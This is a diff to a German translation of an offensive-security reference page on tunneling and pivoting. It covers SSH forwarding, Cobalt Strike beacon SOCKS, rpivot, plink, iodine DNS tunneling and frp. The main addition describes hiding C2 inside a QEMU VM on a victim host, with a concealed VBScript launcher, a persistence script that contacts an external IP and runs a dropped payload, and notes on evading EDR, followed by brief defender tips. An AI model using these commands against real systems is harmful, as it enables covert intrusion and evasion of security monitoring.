@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Öffnen Sie neuen Port auf SSH-Server --> Anderer Port
+Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS-Proxy
 
-Öffnen Sie einen Port im Teamserver, der auf allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
+Öffnen Sie einen Port im Teamserver, der an allen Schnittstellen lauscht und verwendet werden kann, um **den Verkehr durch das Beacon zu leiten**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -158,7 +158,7 @@ Zu beachten:
 
 - Beacons Reverse-Port-Forwarding ist dafür ausgelegt, **Verkehr zum Team-Server zu tunneln, nicht um zwischen einzelnen Maschinen weiterzuleiten**.
 - Der Verkehr wird **innerhalb des C2-Verkehrs von Beacon getunnelt**, einschließlich P2P-Links.
-- **Admin-Rechte sind nicht erforderlich**, um Reverse-Port-Forwards auf hohen Ports zu erstellen.
+- **Admin-Rechte sind nicht erforderlich**, um Reverse-Port-Forwarding an hohen Ports zu erstellen.
 
 ### rPort2Port lokal
 
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotieren durch **NTLM-Proxy**
+Durch **NTLM-Proxy** pivotieren
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
+Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -387,8 +387,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Es authentifiziert sich gegen einen Proxy und bindet einen lokalen Port, der an den externen Dienst weitergeleitet wird, den Sie angeben. Dann können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
-Zum Beispiel, um Port 443 weiterzuleiten.
+Es authentifiziert sich gegen einen Proxy und bindet einen Port lokal, der an den externen Dienst weitergeleitet wird, den Sie angeben. Dann können Sie das Tool Ihrer Wahl über diesen Port verwenden.\
+Zum Beispiel den weitergeleiteten Port 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -396,12 +396,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Jetzt, wenn Sie beispielsweise den **SSH**-Dienst beim Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
+Jetzt, wenn Sie beispielsweise den **SSH**-Dienst auf dem Opfer auf Port 443 einstellen, können Sie sich über den Angreifer-Port 2222 damit verbinden.\
 Sie könnten auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet und der Angreifer hört auf Port 2222.
 
 ## YARP
 
-Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden es hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden ihn hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -409,13 +409,13 @@ Ein Reverse-Proxy, der von Microsoft erstellt wurde. Sie finden es hier: [https:
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen über DNS-Abfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um tun-Adapter zu erstellen und Daten zwischen ihnen über DNS-Abfragen zu tunneln.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie:
+Der Tunnel wird sehr langsam sein. Sie können eine komprimierte SSH-Verbindung durch diesen Tunnel erstellen, indem Sie Folgendes verwenden:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -570,7 +570,7 @@ Tunnel: <TUNNEL-UUID>
 credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
 url: http://127.0.0.1:8000
 ```
-Starte den Connector:
+Starten Sie den Connector:
 ```bash
 cloudflared tunnel run mytunnel
 ```
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Verwendung des neuen SSH-Gateways (kein frpc-Binärdatei)
+### Verwendung des neuen SSH-Gateways (kein frpc-Binär)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Der obige Befehl veröffentlicht den Port des Opfers **8080** als **attacker_ip:9000**, ohne zusätzliche Werkzeuge bereitzustellen – ideal für Living-off-the-Land-Pivoting.
+Der obige Befehl veröffentlicht den Port des Opfers **8080** als **attacker_ip:9000**, ohne zusätzliche Tools bereitzustellen – ideal für Living-off-the-Land-Pivoting.
 
-## Andere Werkzeuge zur Überprüfung
+## Verdeckte VM-basierte Tunnel mit QEMU
+
+QEMU’s Benutzer-Modus-Netzwerk (`-netdev user`) unterstützt eine Option namens `hostfwd`, die **einen TCP/UDP-Port auf dem *Host* bindet und in das *Gast*-System weiterleitet**. Wenn das Gast-System einen vollständigen SSH-Daemon ausführt, bietet die hostfwd-Regel eine disposable SSH-Jump-Box, die vollständig innerhalb einer flüchtigen VM lebt – perfekt, um C2-Verkehr vor EDR zu verbergen, da alle bösartigen Aktivitäten und Dateien auf der virtuellen Festplatte bleiben.
+
+### Schnelle Einzeiler
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Der obige Befehl startet ein **Tiny Core Linux**-Image (`tc.qcow2`) im RAM.  
+• Der Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** im Gast weitergeleitet.  
+• Aus der Sicht des Angreifers stellt das Ziel einfach den Port 2222 zur Verfügung; alle Pakete, die ihn erreichen, werden vom SSH-Server, der in der VM läuft, verarbeitet.  
+
+### Stealthy Start über VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Das Ausführen des Skripts mit `cscript.exe //B update.vbs` hält das Fenster verborgen.
+
+### In-Guest-Persistenz
+
+Da Tiny Core zustandslos ist, tun Angreifer normalerweise:
+
+1. Payload in `/opt/123.out` ablegen
+2. An `/opt/bootlocal.sh` anhängen:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. `home/tc` und `opt` zu `/opt/filetool.lst` hinzufügen, damit die Payload beim Herunterfahren in `mydata.tgz` gepackt wird.
+
+### Warum dies die Erkennung umgeht
+
+• Nur zwei nicht signierte ausführbare Dateien (`qemu-system-*.exe`) berühren die Festplatte; keine Treiber oder Dienste sind installiert.  
+• Sicherheitsprodukte auf dem Host sehen **harmlosen Loopback-Verkehr** (das tatsächliche C2 endet innerhalb der VM).  
+• Speicherscanner analysieren niemals den bösartigen Prozessspeicher, da er in einem anderen OS lebt.
+
+### Defender-Tipps
+
+• Warnen Sie vor **unerwarteten QEMU/VirtualBox/KVM-Binärdateien** in benutzerschreibbaren Pfaden.  
+• Blockieren Sie ausgehende Verbindungen, die von `qemu-system*.exe` ausgehen.  
+• Suchen Sie nach seltenen hörenden Ports (2222, 10022, …), die sofort nach einem QEMU-Start gebunden werden.
+
+---
+
+## Andere Tools zur Überprüfung
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Referenzen
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
